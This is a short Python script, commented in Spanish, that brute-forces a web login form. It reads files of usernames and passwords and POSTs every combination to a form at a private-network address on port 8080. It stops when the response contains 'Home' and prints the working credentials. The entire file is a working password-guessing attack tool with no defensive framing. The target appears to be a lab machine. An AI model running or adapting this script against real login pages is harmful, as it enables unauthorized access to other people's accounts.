#brute force: http://192.168.1.106:8080
import sys
import requests

def main():
    if len(sys.argv) < 5 or sys.argv[1] != "-u" or sys.argv[3] != "-p":
        print(f"Usage: python3 {sys.argv[0]} -u <file_users> -p <file_passwords>")
        sys.exit(1)

    usuarios_file = sys.argv[2]
    contraseñas_file = sys.argv[4]

    with open(usuarios_file, "r") as usuarios_file:
        usuarios = usuarios_file.read().splitlines()

    with open(contraseñas_file, "r") as contraseñas_file:
        contraseñas = contraseñas_file.read().splitlines()

    url = "http://192.168.1.106:8080"

    method = "POST"

    for usuario in usuarios:
        for contraseña in contraseñas:
            payload = {
                'usernombre': usuario,
                'passcontraseña': contraseña,
                'LoginO': 'Login',
            }

            response = requests.request(method, url, data=payload)

            if "Home" in response.text:
                print(f"Sesión iniciada correctamente con usuario: {usuario}, contraseña: {contraseña}")
                exit()
            else:
                print(f"No se pudo iniciar sesión con usuario: {usuario}, contraseña: {contraseña}")

if __name__ == "__main__":
    main()